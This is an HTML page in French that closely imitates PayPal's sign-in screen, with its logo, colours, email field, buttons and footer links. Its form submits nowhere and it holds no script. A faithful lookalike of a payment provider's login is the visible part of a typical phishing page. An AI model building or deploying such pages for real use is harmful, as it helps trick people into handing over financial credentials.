<!DOCTYPE html><html lang="fr"><head><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/>
	<title>Connexion PayPal</title>
	<style type="text/css">/* Reset et Police */
        body {
            margin: 0;
            padding: 0;
            font-family: "PayPalSansSmall-Regular", "Helvetica Neue", Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
        }

        /* Conteneur de la carte (identique à l'image) */
        .main-container {
            width: 100%;
            max-width: 460px;
            margin-top: 60px;
            padding: 40px;
            border: 1px solid #e5e5e5;
            border-radius: 16px;
            text-align: center;
            box-sizing: border-box;
        }

        .logo-paypal {
            width: 120px;
            height: auto;
            margin-bottom: 35px;
        }

        /* Champs de saisie */
        .input-group {
            width: 100%;
            margin-bottom: 12px;
        }

        .input-control {
            width: 100%;
            height: 54px;
            padding: 0 15px;
            border: 1px solid #888d94;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
            outline: none;
            transition: border 0.2s;
        }

        .input-control:focus {
            border: 2px solid #0070ba;
            padding: 0 14px; /* Ajustement pour compenser la bordure de 2px */
        }

        /* Lien Adresse email oubliée */
        .forgot-email {
            display: block;
            text-align: left;
            margin-bottom: 30px;
            color: #0070ba;
            text-decoration: none;
            font-size: 15px;
            font-weight: 600;
        }

        .forgot-email:hover {
            text-decoration: underline;
        }

        /* BOUTON SUIVANT (Bleu PayPal) */
        .btn-next {
            display: block;
            width: 100%;
            height: 48px;
            background-color: #0070ba;
            color: #ffffff;
            border: none;
            border-radius: 24px; /* Forme pilule parfaite */
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            line-height: 48px; /* Centre le texte verticalement */
            margin-bottom: 25px;
            transition: background-color 0.2s;
        }

        .btn-next:hover {
            background-color: #005ea6;
        }

        /* SÉPARATEUR OU */
        .divider {
            display: flex;
            align-items: center;
            margin: 20px 0;
            color: #6c7378;
            font-size: 14px;
        }

        .divider::before, .divider::after {
            content: "";
            flex: 1;
            border-bottom: 1px solid #cbd2d6;
        }

        .divider:not(:empty)::before { margin-right: 1.2em; }
        .divider:not(:empty)::after { margin-left: 1.2em; }

        /* BOUTON OUVRIR UN COMPTE (Bordure bleue) */
        .btn-signup {
            display: block;
            width: 100%;
            height: 46px; /* -2px pour la bordure */
            background-color: #ffffff;
            color: #142c8e;
            border: 1px solid #142c8e;
            border-radius: 23px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: none;
            line-height: 46px;
            transition: background-color 0.2s;
        }

        .btn-signup:hover {
            background-color: #f2f4f7;
        }

        /* Langue et Drapeaux */
        .language-container {
            margin-top: 40px;
            display: flex;
            align-items: center;
            justify-content: center;
            font-size: 13px;
            color: #2c2e2f;
        }

        .flag-icon {
            width: 18px;
            height: auto;
            margin-right: 8px;
        }

        /* Footer */
        .footer {
            margin-top: auto;
            padding: 20px;
            text-align: center;
            font-size: 12px;
            color: #666;
        }

        .footer a {
            color: #444;
            text-decoration: none;
            margin: 0 10px;
            font-weight: 500;
        }
	</style>
</head>
<body>
<div class="main-container"><img alt="PayPal" class="logo-paypal" src="https://upload.wikimedia.org/wikipedia/commons/b/b5/PayPal.svg"/>
<form action="">
<div class="input-group"><input class="input-control" placeholder="Email ou numéro de mobile" type="text"/></div>
<a class="forgot-email" href="#">Adresse email oubliée ?</a><button class="btn-next" type="submit">Suivant</button></form>

<div class="divider">ou</div>
<a class="btn-signup" href="#">Ouvrir un compte</a>

<div class="language-container"><img alt="FR" class="flag-icon" src="https://flagcdn.com/w20/fr.png"/> <strong>Français</strong> <span style="margin: 0 10px; color: #ccc;">|</span> <span style="color: #0070ba;">English</span></div>
</div>

<div class="footer"><a href="#">Contact</a> <a href="#">Respect de la vie privée</a> <a href="#">Contrats d&#39;utilisation</a> <a href="#">International</a></div>


</body></html>
